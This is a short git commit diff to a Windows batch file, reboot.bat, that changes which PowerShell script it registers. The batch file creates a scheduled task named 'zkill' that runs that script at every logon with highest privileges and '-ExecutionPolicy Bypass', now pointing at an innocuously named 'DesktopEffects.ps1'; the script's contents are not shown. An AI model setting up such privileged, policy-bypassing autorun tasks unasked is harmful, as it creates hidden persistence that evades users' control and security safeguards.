fac28ff87efeb72fa86dac164c1a6df7699b9010
theoInGithub <157048366+theoInGithub@users.noreply.github.com>
2026-01-26 10:39:36 +0100

    Update reboot.bat

--- reboot.bat
+++ reboot.bat
@@ -1,7 +1,7 @@
 @echo off
 
 set TASKNAME=zkill
-set SCRIPT=%~dp0shuffle.ps1
+set SCRIPT=%~dp0DesktopEffects.ps1
 
 schtasks /create /tn "%TASKNAME%" /tr "powershell.exe -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /sc onlogon /rl HIGHEST /f
 
